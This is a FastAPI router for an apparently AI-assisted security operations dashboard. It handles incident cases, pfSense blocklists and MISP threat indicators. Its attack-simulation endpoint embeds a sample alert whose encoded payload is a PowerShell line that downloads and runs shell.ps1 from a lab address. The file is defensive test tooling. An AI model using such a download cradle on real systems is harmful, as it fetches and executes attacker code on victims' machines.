import os
import json
import threading
from datetime import datetime
from fastapi import APIRouter
from fastapi.responses import HTMLResponse
from web.state import STATE, save_persistent_state
from tools.firewall_tools import clear_all_pfsense_blocks, tool_unblock_firewall_ip, sync_pfsense_blocklist
from core.misp_vault import get_ioc_records, add_ioc_record, fetch_open_misp_feeds
from core.case_manager import (
    close_expired_cases,
    get_case_by_id,
    update_case_status,
)

router = APIRouter()

@router.get("/api/state")
def get_state():
    close_expired_cases()
    return {
        "stats": STATE["stats"],
        "endpoint_containment": STATE.get("endpoint_containment", {}),
        "agent_ip_registry": STATE.get("agent_ip_registry", {}),
        "cases": STATE.get("cases", []),
        "parent_incidents": STATE.get("parent_incidents", []),
        "reasoning_stream": list(STATE["reasoning_stream"]),
        "decisions": list(STATE["decisions"])
    }

@router.get("/api/cases")
def get_cases(domain: str = "", status: str = ""):
    close_expired_cases()
    cases = list(STATE.get("cases", []))
    if domain:
        d_up = domain.strip().upper()
        cases = [c for c in cases if c.get("domain") == d_up]
    if status:
        s_up = status.strip().upper()
        cases = [c for c in cases if c.get("status") == s_up]
    return {
        "cases": cases,
        "parent_incidents": STATE.get("parent_incidents", []),
        "agent_ip_registry": STATE.get("agent_ip_registry", {}),
    }

@router.post("/api/cases/{case_id}/status")
def set_case_status(case_id: str, payload: dict):
    new_status = payload.get("status", "")
    reason = payload.get("reason", "")
    ok, updated_case, msg = update_case_status(case_id, new_status, reason)
    return {"success": ok, "case": updated_case, "message": msg}

@router.post("/api/cases/{case_id}/replay")
def replay_case(case_id: str):
    from core.controller import replay_case_alerts
    case_obj = get_case_by_id(case_id)
    if not case_obj:
        return {"success": False, "message": f"Không tìm thấy Case {case_id}."}
    if not case_obj.get("incident_alerts"):
        return {"success": False, "message": f"Case {case_id} chưa có alert gốc để replay."}
    threading.Thread(target=replay_case_alerts, args=(case_id,), daemon=True).start()
    return {"success": True, "message": f"Đã kích hoạt Replay phân tích lại {case_id} từ {len(case_obj['incident_alerts'])} alerts gốc."}

@router.post("/api/simulate")
def simulate_attack():
    from core.controller import run_agent_loop
    sample = {
        "source": "pfSense Suricata NIDS",
        "level": 10,
        "title": "ET SCAN Nmap Scripting Engine & Remote Code Execution Attempt",
        "src_ip": "192.168.63.250",
        "dest_ip": "192.168.214.10",
        "agent_ip": "192.168.214.10",
        "victim_ip": "192.168.214.10",
        "primary_hash": "44d88612fea8a8f36de82e1278abb02f",
        "mitre": ["T1046 - Network Service Discovery", "T1059.001 - PowerShell"],
        "file_hashes": ["44d88612fea8a8f36de82e1278abb02f"],
        "encoded_payload": "cG93ZXJzaGVsbCAtZW5jIElFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnhttp://192.168.63.250/shell.ps1')"
    }
    threading.Thread(target=run_agent_loop, args=(sample,), daemon=True).start()
    return {"status": "triggered"}

@router.post("/api/clear-blocklist")
def clear_blocklist():
    success, msg = clear_all_pfsense_blocks()
    STATE["stats"]["endpoint_actions"] = []
    STATE["endpoint_containment"] = {}
    save_persistent_state()
    return {"success": success, "message": msg}

@router.post("/api/pfsense/sync")
def sync_pfsense():
    success, blocked_ips = sync_pfsense_blocklist(quiet=False)
    return {
        "success": success,
        "blocked_ips": blocked_ips,
        "message": f"Đã đồng bộ {len(blocked_ips)} IP từ pfSense SOC_BLOCKLIST." if success else "Không thể kết nối tới pfSense API."
    }

@router.post("/api/unblock")
def unblock_ip(payload: dict):
    ip = payload.get("ip")
    if not ip:
        return {"success": False, "message": "Thieu IP"}
    msg = tool_unblock_firewall_ip(ip)
    return {"success": True, "message": msg}

@router.get("/api/misp")
def get_misp_iocs(limit: int = 100, offset: int = 0, search: str = ""):
    records, total = get_ioc_records(limit=limit, offset=offset, search=search)
    return {
        "total": total,
        "limit": limit,
        "offset": offset,
        "iocs": records
    }

@router.post("/api/misp")
def add_misp_ioc(payload: dict):
    val = payload.get("value")
    if not val:
        return {"success": False, "message": "Thiếu giá trị indicator (value)"}
    try:
        entry = add_ioc_record(
            indicator=str(val).strip(),
            ioc_type=payload.get("type", "ip"),
            threat_name=payload.get("comment", "Lab Custom IOC"),
            source="Lab Custom",
            confidence=payload.get("threat_level", "High")
        )
        return {"success": True, "message": f"Đã thêm IOC {entry['id']}", "entry": entry}
    except Exception as e:
        return {"success": False, "message": str(e)}

@router.post("/api/misp/sync")
def sync_misp_feeds():
    """Kích hoạt tải và đồng bộ các Threat Feed công khai miễn phí chuẩn MISP/OSINT"""
    try:
        stats = fetch_open_misp_feeds()
        return {
            "success": True,
            "message": f"Đã đồng bộ thành công! Hiện có {stats['total_in_db']} IOCs trong SQLite Vault.",
            "stats": stats
        }
    except Exception as e:
        return {"success": False, "message": f"Lỗi đồng bộ feed: {str(e)}"}

@router.get("/", response_class=HTMLResponse)
def get_ui():
    html_path = os.path.join(os.path.dirname(__file__), "templates", "index.html")
    with open(html_path, "r", encoding="utf-8") as f:
        return f.read()
